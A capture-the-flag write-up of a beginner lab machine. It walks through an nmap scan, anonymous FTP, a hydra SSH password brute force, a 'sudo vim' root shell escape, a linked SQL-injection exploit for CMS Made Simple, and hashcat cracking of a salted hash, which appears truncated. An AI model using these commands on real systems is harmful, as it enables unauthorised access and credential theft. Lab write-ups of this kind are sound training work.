# Simple CTF

### Simple CTF
Initial nmap scan shows port 21(ftp), 80(http) and 2222(ssh) open. 

    PORT     STATE SERVICE VERSION
    21/tcp   open  ftp     vsftpd 3.0.3
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.11.85.53
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 3
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_Can't get directory listing: TIMEOUT
    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
    | http-robots.txt: 2 disallowed entries 
    |_/ /openemr-5_0_1_3 
    |_http-title: Apache2 Ubuntu Default Page: It works
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
    |   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
    |_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

FTP server allows anonymous login and shows this text file: <br />
![image](https://github.com/user-attachments/assets/b67869b8-122c-414d-a30a-dab1a12b0c8e)<br />
So since apparently this password is weak, I decided to bruteforce ssh login on the user `mitch` with the command `hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 10.10.229.116 ssh`. 
This was enough to find the password, log into mitch ssh account and get the user flag. For privesc, if I run `sudo -l` I get: <br />
![image](https://github.com/user-attachments/assets/2117a96a-fa21-42f9-8f07-5f5ce2a94b5a)<br />
The exploit for this can be easily found on [GTFObins](https://gtfobins.github.io/gtfobins/vim/#sudo). Just run `sudo vim -c ':!/bin/sh'` and get the root flag.<br /><br />

This CTF is intended for beginners, and the main path is to exploit `CVE-2019-9053`, which is a blind SQL injection vulnerability in `CMS Made Simple <= 2.2.10`, that allows you to retrieve user login information. To exploit it, I found [this](https://github.com/ELIZEUOPAIN/CVE-2019-9053-CMS-Made-Simple-2.2.10---SQL-Injection-Exploit/blob/main/cve.py) script that works very well.<br />
It essentially uses the blind SQLi to read from a users table, and dump the username, the email, the salt and hash of the password. Once the exploit finishes, you should end up with something like this: <br />
![image](https://github.com/user-attachments/assets/81572b1e-9649-419c-a736-e405ba8012c9)<br />
To crack it, create a file `hash.txt` with the following content (hash:salt)

    c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Now use hashcat to crack it, with the command `hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt`.
